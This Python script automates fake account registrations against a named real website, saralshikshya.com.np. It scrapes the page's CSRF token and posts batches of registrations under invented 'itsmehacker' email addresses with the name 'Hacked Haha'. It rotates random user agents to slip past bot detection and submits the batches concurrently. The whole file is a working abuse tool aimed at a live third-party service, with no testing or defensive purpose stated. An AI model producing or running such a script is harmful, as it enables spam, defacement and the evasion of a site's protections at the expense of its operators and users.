import asyncio
import aiohttp
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Function to generate random numbers
def generate_random_numbers():
    return ''.join(str(random.randint(0, 9)) for _ in range(3))

# Function to get token from server
async def get_token(session, headers):
    url = 'https://saralshikshya.com.np/register'
    try:
        async with session.get(url, headers=headers) as response:
            response.raise_for_status()
            soup = BeautifulSoup(await response.text(), 'html.parser')
            token = soup.find('input', {'name': '_token'}).get('value')
            return token
    except aiohttp.ClientError as e:
        print(f"Failed to get token: {e}")
        return None

# Function to submit form
async def submit_form(_token, session, _method, name, email, password, password_confirmation, headers):
    url = 'https://saralshikshya.com.np/register'
    data = {
        '_token': _token,
        '_method': _method,
        'name': name,
        'email': email,
        'password': password,
        'confirm_password': password_confirmation,
    }
    try:
        async with session.post(url, data=data, headers=headers) as response:
            if 'https://saralshikshya.com.np/myprofile' in str(response.url):
                print("Form submitted successfully.")
            else:
                print("Form submission failed.")
    except aiohttp.ClientError as e:
        print("An error occurred:", e)

async def main():
    ua = UserAgent()
    user_agents = [ua.random for _ in range(1000)]
    
    tasks = []
    async with aiohttp.ClientSession() as session:
        for _ in range(5):
            email = f'itsmehacker{generate_random_numbers()}@gmail.com'
            headers = {"User-Agent": random.choice(user_agents)}
            _token = await get_token(session, headers)
            if _token:
                task = submit_form(_token, session, 'post', 'Hacked Haha', email, 'its_hack@123450', 'its_hack@123450', headers)
                tasks.append(task)
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
